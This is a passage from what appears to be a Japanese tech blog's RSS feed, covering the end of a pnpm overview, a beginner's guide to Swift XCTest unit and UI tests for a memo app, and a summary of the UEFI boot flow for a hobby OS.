error</code>でのGoogle検索件数を見ると、npmが4,200万件、yarnが4,000万件であるのに対して、pnpmは70万件です。トラブルで開発が止まった時に多大な損失が生じる業務での開発では情報量の少なさは問題になりやすいでしょう</li></ul></li><li>他のツールから移行する場合、メンバーのキャッチアップする必要があったり、作業自動化に用いるスクリプトを改修をしなければいけなくなったりして、移行コストがかかる（pnpmだけではなく、移行全体にいえる問題ですが）</li></ul><p>そして、pnpmを用いることで早くなるのはパッケージのインストールにかかる時間であり、アプリのパフォーマンスが向上するわけではありません。CIでテストを実行するときなどで、セットアップに多くの時間がかかっている場合はpnpmを使う効果が高いですが、そうではないことも多いでしょう。</p><p>pnpmを導入する手間に対して、pnpmを使うことによるメリットが見合っているかは考える必要があります。</p><h3 id="まとめ"><a href="#まとめ" class="headerlink" title="まとめ"></a>まとめ</h3><p>pnpmの概要と、内部でどのように管理しているのかを眺めました。</p><p>まだpnpmをそこまで本格的には利用してはいませんが、使っていて特に問題なければ、少なくとも個人開発では利用したいと考えています。</p><p>次は森さんの<a href="/articles/20230517a/">WebAssemblyとEmscriptenに入門した</a> です。</p><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style:none; padding-left: 0;"><li id="fn:1"><span style="vertical-align: top; padding-right: 10px;">1.</span><span style="vertical-align: top;"><code>pnpm</code>が正確な表記です。ちなみに、<a href="https://pnpm.io/">公式ドキュメントトップページ</a>のタイトルでは<code>pnpm</code>の各文字の大文字小文字がランダムに決まる（20秒ごとに再生成される）仕掛けになっており、筆者が最初に表記を確認したときは<code>Pnpm</code>だったため、これが正確な表記と暫く勘違いしていました。</span><a href="#fnref:1" rev="footnote"> ↩</a></li><li id="fn:2"><span style="vertical-align: top; padding-right: 10px;">2.</span><span style="vertical-align: top;"><a href="https://pnpm.io/faq#what-does-pnpm-stand-for">https://pnpm.io/faq#what-does-pnpm-stand-for</a></span><a href="#fnref:2" rev="footnote"> ↩</a></li><li id="fn:3"><span style="vertical-align: top; padding-right: 10px;">3.</span><span style="vertical-align: top;">詳細はnpmの<a href="https://npm.github.io/how-npm-works-docs/npm3/how-npm3-works.html">How npm3 Works</a>を参照してください</span><a href="#fnref:3" rev="footnote"> ↩</a></li></ol></div></div>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Programming/">Programming</category>
      
      
      <category domain="https://future-architect.github.io/tags/%E3%82%B3%E3%82%A2%E3%83%86%E3%82%AF/">コアテク</category>
      
      <category domain="https://future-architect.github.io/tags/%E3%83%95%E3%83%AD%E3%83%B3%E3%83%88%E3%82%A8%E3%83%B3%E3%83%89/">フロントエンド</category>
      
      <category domain="https://future-architect.github.io/tags/npm/">npm</category>
      
      <category domain="https://future-architect.github.io/tags/pnpm/">pnpm</category>
      
      <category domain="https://future-architect.github.io/tags/%E3%83%91%E3%83%83%E3%82%B1%E3%83%BC%E3%82%B8%E7%AE%A1%E7%90%86/">パッケージ管理</category>
      
      
      <comments>https://future-architect.github.io/articles/20230516a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Swiftの自動テスト〜導入と基本的なテスト手法〜</title>
      <link>https://future-architect.github.io/articles/20230515a/</link>
      <guid>https://future-architect.github.io/articles/20230515a/</guid>
      <pubDate>Sun, 14 May 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot; title=&quot;はじめに&quot;&gt;&lt;/a&gt;はじめに&lt;/h2&gt;&lt;p&gt;はじめまして、2023年3月キャリア入社、HealthCare Inovation</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>はじめまして、2023年3月キャリア入社、HealthCare Inovation Group(HIG)所属の寒河江です。<br><a href="/articles/20230417a/">春の入門ブログ連載</a>の17日目です。</p><p>本記事はSwiftでの自動テストについての入門記事です。SwiftはXcodeを用いてiOSアプリが作成でき、自作して手元の端末で動きが見やすいため初心者がモチベーション維持したまま開発できる良い題材かなと思います。「作って動いて楽しいなぁ」→「テストしてみよう！」→ <strong>「楽にできる方法ないかな？」</strong> と思った方に見ていただければです。</p><p>簡単なメモアプリを作成し、それに対して部分的にテストコードを書いてみたので早速紹介していきます。</p><h2 id="作ったメモアプリ"><a href="#作ったメモアプリ" class="headerlink" title="作ったメモアプリ"></a>作ったメモアプリ</h2><p><a href="https://github.com/SagaeKugo/CRUD">https://github.com/SagaeKugo/CRUD</a></p><img src="/images/20230515a/メモ動画.gif" alt="メモ動画.gif" width="360" height="240" loading="lazy"><h2 id="XCTestのセットアップ"><a href="#XCTestのセットアップ" class="headerlink" title="XCTestのセットアップ"></a>XCTestのセットアップ</h2><p>今回はプロジェクト作成後にテストを追加します。</p><p>Xcodeを開いてFile→New→Targetを選択し</p><img src="/images/20230515a/スクリーンショット_2023-05-15_12.24.45.png" alt="" width="1144" height="708" loading="lazy"><p>対象となるテストを追加します。今回はUT&#x2F;UIテストどちらも実施するためどちらも追加します。</p><img src="/images/20230515a/スクリーンショット_2023-05-15_12.24.03.png" alt="" width="1200" height="858" loading="lazy"><p>テスト用のフォルダが作成され、TARGETにテストが追加されました。</p><img src="/images/20230515a/スクリーンショット_2023-05-15_12.31.48.png" alt="" width="966" height="644" loading="lazy"><h2 id="UT対象"><a href="#UT対象" class="headerlink" title="UT対象"></a>UT対象</h2><p>例のため、極端に簡素化した関数を作成してテストします</p><figure class="highlight swift"><figcaption><span>Utils.swift</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Foundation</span><br><span class="line"></span><br><span class="line"><span class="comment">// テスト用足し算関数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">func</span> <span class="title function_">calcAdd</span>(<span class="params">a</span>: <span class="type">Int</span> , <span class="params">b</span>: <span class="type">Int</span>)  -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a <span class="operator">+</span> b</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// テスト引き算関数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">func</span> <span class="title function_">calcSub</span>(<span class="params">a</span>: <span class="type">Int</span> , <span class="params">b</span>: <span class="type">Int</span>)  -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a <span class="operator">-</span> b</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// テスト用割り算関数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">func</span> <span class="title function_">calcDiv</span>(<span class="params">a</span>: <span class="type">Int</span> , <span class="params">b</span>: <span class="type">Int</span>)  -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a <span class="operator">/</span> b</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// テスト用掛け算関数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">func</span> <span class="title function_">calcMulti</span>(<span class="params">a</span>: <span class="type">Int</span> , <span class="params">b</span>: <span class="type">Int</span>)  -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a <span class="operator">*</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="UTの実施①〜デフォルトで入っている関数の扱い〜"><a href="#UTの実施①〜デフォルトで入っている関数の扱い〜" class="headerlink" title="UTの実施①〜デフォルトで入っている関数の扱い〜"></a>UTの実施①〜デフォルトで入っている関数の扱い〜</h2><p>先ほどUnit Testing Bungleを選択して追加したCRUDTestsにテストコードを記載していきます。</p><figure class="highlight swift"><figcaption><span>CRUDTests.swift</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> XCTest</span><br><span class="line"><span class="keyword">@testable</span> <span class="keyword">import</span> CRUD</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">CRUDTests</span>: <span class="title class_">XCTestCase</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="keyword">func</span> <span class="title function_">setUpWithError</span>() <span class="keyword">throws</span> &#123;</span><br><span class="line">        <span class="comment">// Put setup code here. This method is called before the invocation of each test method in the class.</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="keyword">func</span> <span class="title function_">tearDownWithError</span>() <span class="keyword">throws</span> &#123;</span><br><span class="line">        <span class="comment">// Put teardown code here. This method is called after the invocation of each test method in the class.</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">func</span> <span class="title function_">testExample</span>() <span class="keyword">throws</span> &#123;</span><br><span class="line">        <span class="comment">// This is an example of a functional test case.</span></span><br><span class="line">        <span class="comment">// Use XCTAssert and related functions to verify your tests produce the correct results.</span></span><br><span class="line">        <span class="comment">// Any test you write for XCTest can be annotated as throws and async.</span></span><br><span class="line">        <span class="comment">// Mark your test throws to produce an unexpected failure when your test encounters an uncaught error.</span></span><br><span class="line">        <span class="comment">// Mark your test async to allow awaiting for asynchronous code to complete. Check the results with assertions afterwards.</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">func</span> <span class="title function_">testPerformanceExample</span>() <span class="keyword">throws</span> &#123;</span><br><span class="line">        <span class="comment">// This is an example of a performance test case.</span></span><br><span class="line">        measure &#123;</span><br><span class="line">            <span class="comment">// Put the code you want to measure the time of here.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 足し算</span></span><br><span class="line">    <span class="keyword">func</span> <span class="title function_">testCulcAdd</span>() <span class="keyword">throws</span> &#123;</span><br><span class="line">        <span class="type">XCTAssertEqual</span>(<span class="type">CRUD</span>.calcAdd(a: <span class="number">27</span> , b: <span class="number">2</span>) , <span class="number">29</span>)</span><br><span class="line">        <span class="type">XCTAssertEqual</span>(<span class="type">CRUD</span>.calcAdd(a: <span class="number">2</span> , b: <span class="number">2</span>) , <span class="number">4</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 引き算</span></span><br><span class="line">    <span class="keyword">func</span> <span class="title function_">testCulcSub</span>() <span class="keyword">throws</span> &#123;</span><br><span class="line">        <span class="type">XCTAssertEqual</span>(<span class="type">CRUD</span>.calcSub(a: <span class="number">27</span> , b: <span class="number">2</span>) , <span class="number">25</span>)</span><br><span class="line">        <span class="type">XCTAssertEqual</span>(<span class="type">CRUD</span>.calcSub(a: <span class="number">2</span> , b: <span class="number">22</span>) , <span class="operator">-</span><span class="number">20</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 割り算</span></span><br><span class="line">    <span class="keyword">func</span> <span class="title function_">testCulcDiv</span>() <span class="keyword">throws</span> &#123;</span><br><span class="line">        <span class="type">XCTAssertEqual</span>(<span class="type">CRUD</span>.calcDiv(a: <span class="number">27</span> , b: <span class="number">2</span>) , <span class="number">13</span>)</span><br><span class="line">        <span class="type">XCTAssertEqual</span>(<span class="type">CRUD</span>.calcDiv(a: <span class="number">2</span> , b: <span class="number">2</span>) , <span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 掛け算</span></span><br><span class="line">    <span class="keyword">func</span> <span class="title function_">testCulcMulti</span>()<span class="keyword">throws</span> &#123;</span><br><span class="line">        <span class="type">XCTAssertEqual</span>(<span class="type">CRUD</span>.calcMulti(a: <span class="number">27</span> , b: <span class="number">2</span>) , <span class="number">54</span>)</span><br><span class="line">        <span class="type">XCTAssertEqual</span>(<span class="type">CRUD</span>.calcMulti(a: <span class="number">3</span> , b: <span class="number">2</span>) , <span class="number">6</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>デフォルトで4つのテスト関数が記載されていますが、これらはざっと以下の意味で、今回は変更する必要はないので無視します。</p><ul><li><code>setUpWithError()</code><ul><li>→各テストを実行する前に毎回呼ばれます。</li></ul></li><li>tearDownWithError()&#96;<ul><li>→各テスト実行後に毎回呼ばれます。</li></ul></li><li><code>testExample()</code><ul><li>→テストコードのサンプルです。&lt;test + テスト対象のメソッド名&gt;</li></ul></li><li><code>testPerformanceExample()</code><ul><li>→パフォーマンステストのサンプルです。&lt;testPerformance + テスト対象のメソッド名&gt;</li></ul></li></ul><p>そのため、XCTestCaseをまとめてテストを回すと、</p><ol><li><code>setUpWithError()</code></li><li><code>testExample()</code></li><li><code>tearDownWithError()</code></li><li><code>setUpWithError()</code></li><li><code>testCulcAdd()</code></li><li><code>tearDownWithError()</code></li></ol><p>…という流れでテストが動きます。</p><h2 id="UTの実施②〜関数の追加、テスト実行〜"><a href="#UTの実施②〜関数の追加、テスト実行〜" class="headerlink" title="UTの実施②〜関数の追加、テスト実行〜"></a>UTの実施②〜関数の追加、テスト実行〜</h2><p><code>@testable import CRUD</code>と記載することでCRUDアプリ内のpublic,internalシンボルのテストが可能になります。</p><p>Sampleアプリを作成した場合は<code>@testable import Sample</code>になりますね。</p><p>続いてテスト関数を作成します。</p><p>内容は特筆すべき部分はないと思うので省略(参考サイトは末尾に記載)しますが、テスト関数を作成する際は必ず先頭に<code>test</code>と入れる必要があります。<br>先頭にtestと記載することでテストメソッドとして認識され、テストできる関数には左側に菱形マークがつきます。</p><img src="/images/20230515a/スクリーンショット_2023-05-15_13.08.18.png" alt="" width="890" height="150" loading="lazy"><img src="/images/20230515a/スクリーンショット_2023-05-15_13.09.07.png" alt="" width="898" height="152" loading="lazy"><p>それぞれの関数単位で菱形ボタンを押してテスト実行することも可能ですし、CRUDTestsクラスの菱形ボタンを押すことでクラス内のテストをまとめて実施することも可能です。</p><p>成功すると緑のチェックがつき、失敗した場合は赤くバツが出てくれます。</p><img src="/images/20230515a/スクリーンショット_2023-05-15_13.14.12.png" alt="" width="1200" height="771" loading="lazy"><img src="/images/20230515a/スクリーンショット_2023-05-15_13.17.52.png" alt="" width="1200" height="555" loading="lazy"><p>失敗した時のログはこちらから確認できます。</p><img src="/images/20230515a/スクリーンショット_2023-05-15_13.25.31.png" alt="" width="1200" height="441" loading="lazy"><h2 id="UIテストの実施①"><a href="#UIテストの実施①" class="headerlink" title="UIテストの実施①"></a>UIテストの実施①</h2><p>UI Testing Bungleを選択して追加したCRUDUITestsにテストコードを記載していきます。</p><p>デフォルトで<code>CRUDUITests.swift</code>と<code>CRUDUITestsLaunchTests.swift</code>の2ファイル作成されていますが、今回はCRUDUITests.swiftにテストを記載します。デフォルトで書かれているテスト関数はUTで紹介しているものと同じ役割なので省略します。</p><h2 id="UIテストの実施②"><a href="#UIテストの実施②" class="headerlink" title="UIテストの実施②"></a>UIテストの実施②</h2><p>今回テストしたのは下記の１関数のみです。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">func</span> <span class="title function_">testAddDelete</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> app <span class="operator">=</span> <span class="type">XCUIApplication</span>()</span><br><span class="line">    <span class="type">XCTContext</span>.runActivity(named: <span class="string">&quot;Launch app&quot;</span>) &#123; <span class="keyword">_</span> <span class="keyword">in</span></span><br><span class="line">        app.launch()</span><br><span class="line">    &#125;</span><br><span class="line">    app.buttons[<span class="string">&quot;testAdd&quot;</span>].firstMatch.tap()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    app.buttons[<span class="string">&quot;testDelete&quot;</span>].firstMatch.tap()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>testAddボタンを押下することでメモを１０件登録し、testDeleteボタンを押下することでメモを全件削除しています。</p><p>ユーザーが操作せずに見た目が変わることだけを確認したいためメモ内容はチェック対象外としています。メモ内容をテストする場合は別途アサーションを追加しましょう。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> app <span class="operator">=</span> <span class="type">XCUIApplication</span>()</span><br></pre></td></tr></table></figure><p>まずはテスト対象のアプリ<code>XCUIApplication()</code>のインスタンスを作成します。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XCTContext</span>.runActivity(named: <span class="string">&quot;Launch app&quot;</span>) &#123; <span class="keyword">_</span> <span class="keyword">in</span></span><br><span class="line">    app.launch()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>今回の規模であれば不要ですが、<code>XCTContext.runActivity(named: &quot;~~&quot;)</code>を使って長いテストメソッドを名前付きの小さなサブステップに分割することができます。<code>app.launch()</code>はnamedに記載されている通り、アプリの起動を行っています。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.buttons[<span class="string">&quot;testAdd&quot;</span>].firstMatch.tap()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">app.buttons[<span class="string">&quot;testDelete&quot;</span>].firstMatch.tap()</span><br></pre></td></tr></table></figure><p>テスト対象のアプリ内の<code>testAdd</code>、<code>testDelete</code>というラベルのついたボタンを検索し、最初に見つかったものをタップしています。複数同じ名前のボタンがある場合は、<code>accessibilityIdentifier</code>を設定することで分類することができます。(参考サイトにリンク記載）</p><h2 id="UIテスト動画"><a href="#UIテスト動画" class="headerlink" title="UIテスト動画"></a>UIテスト動画</h2><p>マウス操作しなくてもシミュレータ画面左上のtestAdd,testDeleteボタンが押下されています。</p><img src="/images/20230515a/UItest動画.gif" alt="UItest動画" width="360" height="240" loading="lazy"><h2 id="さいごに"><a href="#さいごに" class="headerlink" title="さいごに"></a>さいごに</h2><p>長い記事になってしまいましたが、読んでくださった方ありがとうございます。</p><p>「はじめに」にも書きましたがiOSアプリは普段使う分実機テストもしやすく自分の欲しいものを作ることもできるので、初心者がモチベーションを維持しながら技術を身につけるにはいい題材だと思います。(私も初心者なので書いて遊んでます)</p><p>今回紹介できませんでしたが、CoreDataというのを使ってサーバーを立てなくてもアプリ上で扱うデータのCRUD処理が簡単にできたりと面倒ごとが少ないのも利点です。せっかく技術を身につけるなら動かして楽しんでスキルアップしていきましょう！！</p><p>次は斎藤賢太さんの<a href="/articles/20230516a/">JSパッケージ管理ツールpnpmの概要と内部構造を眺める</a> です。</p><h2 id="参考サイト"><a href="#参考サイト" class="headerlink" title="参考サイト"></a>参考サイト</h2><ul><li>XCTestで使えるAssert一覧<br><a href="https://qiita.com/shirochan/items/10271912289dc563cc36">XCTestのAssert一覧</a></li><li>accessibilityIdentifierの説明<br><a href="https://qiita.com/terry-private/items/81c07510d90d5946d0fc">XCUIElementの使い方をざっくりまとめてみた</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Programming/">Programming</category>
      
      
      <category domain="https://future-architect.github.io/tags/%E3%83%86%E3%82%B9%E3%83%88/">テスト</category>
      
      <category domain="https://future-architect.github.io/tags/iOS/">iOS</category>
      
      <category domain="https://future-architect.github.io/tags/%E5%88%9D%E5%BF%83%E8%80%85/">初心者</category>
      
      <category domain="https://future-architect.github.io/tags/Swift/">Swift</category>
      
      <category domain="https://future-architect.github.io/tags/XCTest/">XCTest</category>
      
      
      <comments>https://future-architect.github.io/articles/20230515a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>OS自作入門本に触れたのでOS起動までの処理概要をまとめてみた</title>
      <link>https://future-architect.github.io/articles/20230512a/</link>
      <guid>https://future-architect.github.io/articles/20230512a/</guid>
      <pubDate>Thu, 11 May 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot; title=&quot;はじめに&quot;&gt;&lt;/a&gt;はじめに&lt;/h2&gt;&lt;p&gt;はじめまして、2022年4月入社・Technology Inovation</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>はじめまして、2022年4月入社・Technology Inovation Group（TIG）所属の栗栖です。</p><p><a href="/articles/20230417a/">春の入門ブログ連載</a>の16日目です。</p><p>最近、<a href="https://www.amazon.co.jp/gp/product/B08Z3MNR9J?ie=UTF8&psc=1&linkCode=sl1&tag=k-tw-22&linkId=09411e4f3f3b631351b67d7c6d518fec&language=ja_JP&ref_=as_li_ss_tl">ゼロからのOS自作入門</a>（通称：みかん本）を読み始めました。</p><p>ソースレベルで解説があるため深い理解を得やすいですが、OS起動まで処理フローの記載がなく、全体感を把握するのに苦労したので私なりにmikanOSが立ち上がるまでの処理概要をまとめてみました。</p><img src="/images/20230512a/OSBook.png" alt="OSBook" width="400" height="533" loading="lazy"><h2 id="OS起動までの流れ"><a href="#OS起動までの流れ" class="headerlink" title="OS起動までの流れ"></a>OS起動までの流れ</h2><p>OS起動までの流れとしては以下の通り。</p><img src="/images/20230512a/ブートローダ実行までのフロー.drawio.png" alt="ブートローダ実行までのフロー.drawio.png" width="121" height="331" loading="lazy"><h3 id="①電源起動"><a href="#①電源起動" class="headerlink" title="①電源起動"></a>①電源起動</h3><p>CPUがBIOSに格納されたバイナリプログラムを実行する。</p><p>※PCの電源が切れるとメインメモリの内容は消え、次回起動時にCPUは命令を読み取ることができなくなる。電源を切っても記憶内容を保持する不揮発性メモリ（ROM）にBIOSを書き込むことで、CPUがBIOSを実行可能にしている。</p><h3 id="②UEFI-BIOSの実行"><a href="#②UEFI-BIOSの実行" class="headerlink" title="②UEFI BIOSの実行"></a>②UEFI BIOSの実行</h3><p>コンピュータを初期化（CPU動作モードの設定、PCIデバイスの検出）し、接続されたストレージ内のブートローダを検索する。<br>&#x2F;EFI&#x2F;BOOT&#x2F;BOOTX64.EFIをメインメモリ上に展開し実行する。</p><h3 id="③ブートローダの実行"><a href="#③ブートローダの実行" class="headerlink" title="③ブートローダの実行"></a>③ブートローダの実行</h3><p>カーネルファイルを読み出し実行する。</p><h3 id="④カーネルの実行"><a href="#④カーネルの実行" class="headerlink" title="④カーネルの実行"></a>④カーネルの実行</h3><p>システムの機能やリソースを管理し制御する。</p><h2 id="ブートローダとカーネルの用意"><a href="#ブートローダとカーネルの用意" class="headerlink" title="ブートローダとカーネルの用意"></a>ブートローダとカーネルの用意</h2><p>UEFI BIOSがブートローダの実行までしてくれるので、ブートローダとカーネルの実行可能ファイルを用意する。</p><h3 id="ソースファイル"><a href="#ソースファイル" class="headerlink" title="ソースファイル"></a>ソースファイル</h3><h4 id="ブートローダ"><a href="#ブートローダ" class="headerlink" title="ブートローダ"></a>ブートローダ</h4><p>以下の処理があれば良い。</p><ul><li>メモリマップ（物理メモリの配置と使用状況を把握する情報源）を取得する。</li><li>カーネルファイルのヘッダ情報を読み込みイメージベース（バイナリファイルがメモリ上で配置されるアドレス）を特定する</li><li>カーネルを起動しブートサービスを停止させる。</li></ul><h4 id="カーネル"><a href="#カーネル" class="headerlink" title="カーネル"></a>カーネル</h4><p>自分が作るOSでやりたいことを書く。(描画、デバイス制御、アプリケーション等)</p><h3 id="ビルド"><a href="#ビルド" class="headerlink" title="ビルド"></a>ビルド</h3><p>C&#x2F;C++で書いたブートローダとカーネルのソースコードは以下手順で実行する。</p><img src="/images/20230512a/ファイル構成.drawio.png" alt="ファイル構成.drawio.png" width="231" height="481" loading="lazy"><h4 id="コンパイル"><a href="#コンパイル" class="headerlink" title="コンパイル"></a>コンパイル</h4><p>ソースコードからオブジェクトファイル(バイナリコードだが実行可能ではない)を生成する。<br>※1つのソースコードは1つのオブジェクトファイルとなるため、差分のあるソースコードだけを再コンパイルすることで時間を節約できる。</p><h4 id="リンク"><a href="#リンク" class="headerlink" title="リンク"></a>リンク</h4><p>複数のオブジェクトファイルを結合して実行可能なバイナリファイルを生成する。</p><h3 id="ディスクイメージの生成"><a href="#ディスクイメージの生成" class="headerlink" title="ディスクイメージの生成"></a>ディスクイメージの生成</h3><p>ビルドされたファイルをディスクイメージに組み込む。</p><p>手順</p><ol><li>FAT32のディスクイメージファイルを作成する</li><li>ディスクイメージを適当なディレクトリ（例：mnt）マウントする</li><li>マウントされたイメージにビルドされたファイルをコピーする</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">├─mnt</span><br><span class="line">   ├─EFI</span><br><span class="line">   │  ├─BOOT</span><br><span class="line">   │      └─BOOTX64.EFI <span class="comment">#ブートローダ</span></span><br><span class="line">   ├─kernel.elf <span class="comment">#カーネル</span></span><br><span class="line">   └─memmap <span class="comment"># メモリマップ</span></span><br></pre></td></tr></table></figure><ol start="4"><li>ディスクイメージをアンマウントする。</li></ol><p>実機環境であればシステムドライブにディスクイメージを焼いてブートする、</p><p>仮想環境であればQEMU等の仮想マシンでディスクイメージを起動するとOSが立ち上がる。</p><h2 id="さいごに"><a href="#さいごに" class="headerlink" title="さいごに"></a>さいごに</h2><p>本を読む前はOSは複雑で個人では取り掛かりにくい印象がありましたが、立ち上げるために必要な1つ1つの処理は意外と単純でした。立ち上がった後のカーネルの持つリソース管理や制御の実装部分は複雑なので大変だと思います。</p><p>次は寒河江さんの<a href="/articles/20230515a/">Swiftの自動テスト〜導入と基本的なテスト手法〜</a>です。</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Infrastructure/">Infrastructure</category>
      
      
      <category domain="https://future-architect.github.io/tags/%E6%9B%B8%E7%B1%8D/">書籍</category>
      
      <category domain="https://future-architect.github.io/tags/OS/">OS</category>
      
      <category domain="https://future-architect.github.io/tags/%E3%82%BC%E3%83%AD%E3%81%8B%E3%82%89%E3%81%AEOS%E8%87%AA%E4%BD%9C%E5%85%A5%E9%96%80/">ゼロからのOS自作入門</category>
      
      
      <comments>https://future-architect.github.io/articles/20230512a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>正規表現入門</title>
      <link>https://future-architect.github.io/articles/20230510a/</link>
      <guid>https://future-architect.github.io/articles/20230510a/</guid>
      <pubDate>Tue, 09 May 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot; title=&quot;はじめに&quot;&gt;&lt;/a&gt;はじめに&lt;/h2&gt;&lt;p&gt;こんにちは、2022年4月入社・流通製造グループ所属の高世です。&lt;/p&gt;
&lt;p&gt;&lt;a</description>
          
        
      
      
      
